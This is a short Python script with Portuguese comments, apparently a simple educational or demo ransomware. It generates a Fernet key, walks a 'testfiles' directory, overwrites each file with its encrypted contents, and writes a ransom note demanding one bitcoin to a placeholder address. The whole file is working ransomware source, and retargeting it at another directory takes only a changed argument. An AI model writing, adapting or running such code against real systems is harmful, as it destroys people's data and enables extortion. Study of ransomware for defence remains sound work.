# gerar uma chave de criptografia;
from cryptography.fernet import Fernet
import os

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)


# carregar a chave que foi salva;
def carregar_chave():
    return open("chave.key", "rb").read()

#criptografar um unico arquivo;
def criptografar_arquivo(arquivo,chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados=file.read()
        dados_encriptografados= f.encrypt(dados)
        with open (arquivo, "wb") as file:
            file.write(dados_encriptografados)

#encontrar arquivos para serem critografados;
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "randsoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

# criar mensagem de resgate;

def criar_mensagem_de_resgate():
    with open("LEIA ISSO .txt", "w") as f:
        f.write("seus arquivos foram criptografados\n")
        f.write("envie 1 bitcoin para endereço xxxx e envie o comprovante!\n")
        f.write("depois disso enviaremos uma chave para recuperação de seus dados\n")

#execussão do codigo principal;
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("testfiles")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_de_resgate()
    print("ransomware executado! arquivos criptografados")

if __name__ == "__main__":
    main()
